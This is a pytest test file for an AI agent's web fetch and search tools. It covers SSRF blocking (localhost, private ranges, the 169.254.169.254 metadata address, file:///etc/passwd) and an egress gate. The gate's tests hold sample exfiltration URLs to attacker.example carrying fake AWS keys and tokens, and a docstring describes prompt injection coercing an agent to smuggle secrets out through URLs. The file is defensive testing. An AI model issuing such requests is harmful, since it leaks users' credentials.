"""Unit tests for engine/web_tools.py.

All HTTP calls are mocked — no real network access during tests.
"""
from __future__ import annotations

import io
import socket
import urllib.error
from unittest.mock import patch, MagicMock

import pytest

from engine.web_tools import (
    WebToolError,
    _decode_ddg_redirect,
    _DDGResultParser,
    _html_to_text,
    _is_safe_url,
    fetch_url,
    web_search,
)


# ── _is_safe_url ─────────────────────────────────────────────────────────────

class TestIsSafeUrl:
    def test_https_public_ok(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            ok, reason = _is_safe_url("https://example.com/page")
            assert ok, reason

    def test_http_scheme_ok(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            ok, _ = _is_safe_url("http://example.com")
            assert ok

    def test_file_scheme_blocked(self):
        ok, reason = _is_safe_url("file:///etc/passwd")
        assert not ok
        assert "http" in reason

    def test_ftp_scheme_blocked(self):
        ok, _ = _is_safe_url("ftp://example.com/file")
        assert not ok

    def test_localhost_blocked(self):
        ok, reason = _is_safe_url("http://localhost/admin")
        assert not ok
        assert "localhost" in reason

    def test_127_blocked_via_dns(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("127.0.0.1", 0))]
            ok, reason = _is_safe_url("http://internal.test/")
            assert not ok
            assert "loopback" in reason or "non-public" in reason

    def test_rfc1918_10_blocked(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("10.0.0.5", 0))]
            ok, reason = _is_safe_url("http://internal.corp/")
            assert not ok
            assert "private" in reason or "non-public" in reason

    def test_rfc1918_192_168_blocked(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("192.168.1.5", 0))]
            ok, _ = _is_safe_url("http://router.lan/")
            assert not ok

    def test_rfc1918_172_16_blocked(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("172.20.0.1", 0))]
            ok, _ = _is_safe_url("http://docker.internal/")
            assert not ok

    def test_link_local_blocked(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("169.254.169.254", 0))]
            ok, reason = _is_safe_url("http://metadata.aws/")
            assert not ok

    def test_ipv6_loopback_blocked(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET6, 0, 0, "", ("::1", 0, 0, 0))]
            ok, _ = _is_safe_url("http://ipv6.local/")
            assert not ok

    def test_dns_failure_rejected(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.side_effect = socket.gaierror("nodename nor servname provided")
            ok, reason = _is_safe_url("http://this-domain-definitely-does-not-exist.invalid/")
            assert not ok
            assert "DNS" in reason

    def test_missing_hostname_rejected(self):
        ok, _ = _is_safe_url("http:///path-only")
        assert not ok


# ── _html_to_text ────────────────────────────────────────────────────────────

class TestHtmlToText:
    def test_strips_script_and_style(self):
        html_in = """
        <html><head><style>body { color: red; }</style></head>
        <body><p>Hello</p><script>alert('xss')</script><p>World</p></body></html>
        """
        text = _html_to_text(html_in)
        assert "Hello" in text
        assert "World" in text
        assert "alert" not in text
        assert "color: red" not in text

    def test_block_tags_become_newlines(self):
        text = _html_to_text("<p>One</p><p>Two</p><p>Three</p>")
        # Each paragraph should be on its own line
        lines = [l for l in text.split("\n") if l.strip()]
        assert lines == ["One", "Two", "Three"]

    def test_entities_decoded(self):
        text = _html_to_text("<p>5 &gt; 3 &amp; 2 &lt; 4</p>")
        assert "5 > 3 & 2 < 4" in text

    def test_handles_malformed_html(self):
        # Should not raise
        text = _html_to_text("<div>oops <span>unclosed")
        assert "oops" in text
        assert "unclosed" in text

    def test_collapses_whitespace(self):
        text = _html_to_text("<p>  multiple   spaces    here  </p>")
        assert "multiple spaces here" in text
        assert "  " not in text  # no double-spaces in cleaned output


# ── DDG result parser ────────────────────────────────────────────────────────

class TestDDGResultParser:
    def test_parses_typical_result(self):
        # Slimmed-down DDG HTML response shape
        html = '''
        <html><body>
        <div class="result">
          <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage1">Example One</a>
          <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage1">First snippet text</a>
        </div>
        <div class="result">
          <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fother.com%2Fdocs">Other Docs</a>
          <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fother.com%2Fdocs">Second snippet</a>
        </div>
        </body></html>
        '''
        p = _DDGResultParser()
        p.feed(html)
        p.close()
        assert len(p.results) == 2
        assert p.results[0]["title"] == "Example One"
        assert p.results[0]["url"] == "https://example.com/page1"
        assert p.results[0]["snippet"] == "First snippet text"
        assert p.results[1]["title"] == "Other Docs"
        assert p.results[1]["url"] == "https://other.com/docs"

    def test_handles_no_results(self):
        p = _DDGResultParser()
        p.feed("<html><body><p>No results.</p></body></html>")
        p.close()
        assert p.results == []


class TestDecodeDDGRedirect:
    def test_uddg_param_decoded(self):
        url = _decode_ddg_redirect("//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpath%3Fq%3D1")
        assert url == "https://example.com/path?q=1"

    def test_direct_url_passed_through(self):
        url = _decode_ddg_redirect("https://direct.example.com/page")
        assert url == "https://direct.example.com/page"

    def test_empty_returns_none(self):
        assert _decode_ddg_redirect("") is None
        assert _decode_ddg_redirect(None) is None


# ── fetch_url ────────────────────────────────────────────────────────────────

def _mock_urlopen(body: bytes, content_type: str = "text/html; charset=utf-8",
                  content_encoding: str = ""):
    """Return a context-manager mock that urlopen() can produce."""
    cm = MagicMock()
    cm.__enter__ = MagicMock(return_value=cm)
    cm.__exit__ = MagicMock(return_value=False)
    cm.read = MagicMock(side_effect=lambda n=None: body[:n] if n else body)
    headers = {"Content-Type": content_type}
    if content_encoding:
        headers["Content-Encoding"] = content_encoding
    cm.headers = headers
    return cm


class TestFetchUrl:
    def test_html_to_text_by_default(self):
        body = b"<html><body><p>Hello world</p></body></html>"
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(body)
            text = fetch_url("https://example.com")
        assert "Hello world" in text
        assert "<html>" not in text

    def test_raw_returns_html(self):
        body = b"<html><body><p>Raw</p></body></html>"
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(body)
            text = fetch_url("https://example.com", raw=True)
        assert "<p>Raw</p>" in text

    def test_non_html_content_returned_as_is(self):
        body = b"plain text response"
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(body, content_type="text/plain")
            text = fetch_url("https://example.com/data.txt")
        assert "plain text response" in text

    def test_size_cap_truncates_with_marker(self):
        # Body is 10000 'a' chars wrapped in HTML tags; HTML→text yields ~10000 chars.
        # We cap final text at 1000; should see the truncation marker.
        big = b"<html><body>" + (b"a" * 10000) + b"</body></html>"
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(big)
            text = fetch_url("https://example.com", max_bytes=1000)
        assert text.startswith("[truncated to 1000 chars of"), f"got: {text[:100]!r}"

    def test_blocks_file_url(self):
        with pytest.raises(WebToolError, match="http/https"):
            fetch_url("file:///etc/passwd")

    def test_blocks_localhost(self):
        with pytest.raises(WebToolError, match="localhost|loopback|non-public"):
            fetch_url("http://localhost:8080/admin")

    def test_blocks_private_ip(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("192.168.1.1", 0))]
            with pytest.raises(WebToolError, match="private|non-public"):
                fetch_url("http://router.lan")

    def test_empty_url_rejected(self):
        with pytest.raises(WebToolError, match="non-empty"):
            fetch_url("")

    def test_http_error_wrapped(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.side_effect = urllib.error.HTTPError(
                "https://example.com", 404, "Not Found", {}, None
            )
            with pytest.raises(WebToolError, match="HTTP 404"):
                fetch_url("https://example.com")

    def test_url_error_wrapped(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.side_effect = urllib.error.URLError("connection refused")
            with pytest.raises(WebToolError, match="URL error"):
                fetch_url("https://example.com")


# ── egress content gate (densanon.core.egress_gate wire-in) ──────────────────

class TestEgressGate:
    """Wire-in tests for the densanon.core.egress_gate integration.

    The gate scans outbound URLs for embedded secrets BEFORE the network
    call fires. Defends against the Copilot-Cowork attack class where
    prompt injection coerces the agent into smuggling a secret it has
    in working context via an outbound URL parameter.
    """

    def _mock_dns(self):
        """Helper: return a getaddrinfo mock pointing at a public-looking IP
        so the SSRF check passes and we exercise the egress gate path."""
        return patch(
            "engine.web_tools.socket.getaddrinfo",
            return_value=[(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))],
        )

    def test_aws_access_key_in_url_blocked(self):
        with self._mock_dns():
            with pytest.raises(WebToolError, match="egress gate.*AWS Access Key"):
                fetch_url("https://attacker.example/exfil?key=AKIAIOSFODNN7EXAMPLE")

    def test_github_pat_in_url_blocked(self):
        with self._mock_dns():
            with pytest.raises(WebToolError, match="egress gate.*GitHub"):
                fetch_url("https://attacker.example/log?t=ghp_abc123def456ghi789jkl012mno345pqr678stu")

    def test_access_token_query_param_blocked(self):
        with self._mock_dns():
            with pytest.raises(WebToolError, match="egress gate.*Authentication token"):
                fetch_url(
                    "https://attacker.example/exfil?"
                    "access_token=eyJabcdef1234567890_fake_token_with_length"
                )

    def test_onedrive_authkey_pattern_blocked(self):
        # The canonical Copilot Cowork attack URL shape.
        with self._mock_dns():
            with pytest.raises(WebToolError, match="egress gate.*OneDrive"):
                fetch_url("https://1drv.ms/u/s!AbCdEfGhIjKlMnOp?authkey=AbcDefGhi-jklMnoPqrs")

    def test_legitimate_url_passes_egress_gate(self):
        # A clean URL must not be blocked by the egress gate. We don't
        # need a real network call here — mock the HTTP layer so the
        # test runs offline. If the egress gate is incorrectly firing
        # on this URL, the WebToolError would mention "egress gate".
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(b"<html><body>hello</body></html>")
            text = fetch_url("https://docs.python.org/3/library/re.html")
        assert "hello" in text

    def test_legitimate_url_with_short_query_passes(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("93.184.216.34", 0))]
            up.return_value = _mock_urlopen(b"<html><body>ok</body></html>")
            text = fetch_url("https://example.com/search?q=hello&page=2")
        assert "ok" in text

    def test_egress_gate_runs_before_network_call(self):
        # The gate should reject the URL before urlopen is called.
        # Mock DNS so the SSRF check passes; assert urlopen is never hit.
        with self._mock_dns(), \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            up.side_effect = AssertionError("urlopen should not be reached")
            with pytest.raises(WebToolError, match="egress gate"):
                fetch_url("https://attacker.example/x?key=AKIAIOSFODNN7EXAMPLE")
            up.assert_not_called()


# ── web_search ───────────────────────────────────────────────────────────────

DDG_FIXTURE = b'''<html><body>
<div class="result">
  <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fasyncio.html">asyncio docs</a>
  <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fasyncio.html">asyncio is a library to write concurrent code using coroutines.</a>
</div>
<div class="result">
  <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Frealpython.com%2Fasync-io-python%2F">Real Python: asyncio</a>
  <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Frealpython.com%2Fasync-io-python%2F">A tutorial on async/await in Python.</a>
</div>
</body></html>'''


class TestWebSearch:
    def test_returns_formatted_results(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("40.89.244.232", 0))]
            up.return_value = _mock_urlopen(DDG_FIXTURE)
            out = web_search("python asyncio")
        assert "asyncio docs" in out
        assert "https://docs.python.org/3/library/asyncio.html" in out
        assert "Real Python: asyncio" in out
        assert "concurrent code using coroutines" in out

    def test_n_results_caps_output(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("40.89.244.232", 0))]
            up.return_value = _mock_urlopen(DDG_FIXTURE)
            out = web_search("python asyncio", n_results=1)
        assert "asyncio docs" in out
        assert "Real Python" not in out

    def test_n_results_clamped_to_15(self):
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("40.89.244.232", 0))]
            up.return_value = _mock_urlopen(DDG_FIXTURE)
            # Should not error, even with absurd value
            out = web_search("foo", n_results=999)
        assert "asyncio docs" in out

    def test_empty_results_returns_message(self):
        empty = b'<html><body><p>No results.</p></body></html>'
        with patch("engine.web_tools.socket.getaddrinfo") as gai, \
             patch("engine.web_tools.urllib.request.urlopen") as up:
            gai.return_value = [(socket.AF_INET, 0, 0, "", ("40.89.244.232", 0))]
            up.return_value = _mock_urlopen(empty)
            out = web_search("xyzzy_nothing")
        assert "No results" in out

    def test_empty_query_rejected(self):
        with pytest.raises(WebToolError, match="non-empty"):
            web_search("")
        with pytest.raises(WebToolError, match="non-empty"):
            web_search("   ")

    def test_safe_search_off_by_default_sends_kp_minus_2(self):
        """Default safe_search=False must send kp=-2 in the form body."""
        captured = {}

        def fake_get(url, *, timeout, extra_headers=None, method="GET", data=None):
            captured["data"] = data
            return DDG_FIXTURE.decode("utf-8"), "text/html"

        with patch("engine.web_tools._http_get", side_effect=fake_get):
            web_search("python asyncio")
        assert captured["data"] is not None
        body_str = captured["data"].decode("utf-8")
        assert "kp=-2" in body_str, f"expected kp=-2 in body, got: {body_str!r}"

    def test_safe_search_true_sends_kp_minus_1(self):
        """Explicit safe_search=True flips kp to -1 (moderate filtering)."""
        captured = {}

        def fake_get(url, *, timeout, extra_headers=None, method="GET", data=None):
            captured["data"] = data
            return DDG_FIXTURE.decode("utf-8"), "text/html"

        with patch("engine.web_tools._http_get", side_effect=fake_get):
            web_search("python asyncio", safe_search=True)
        body_str = captured["data"].decode("utf-8")
        assert "kp=-1" in body_str, f"expected kp=-1 in body, got: {body_str!r}"
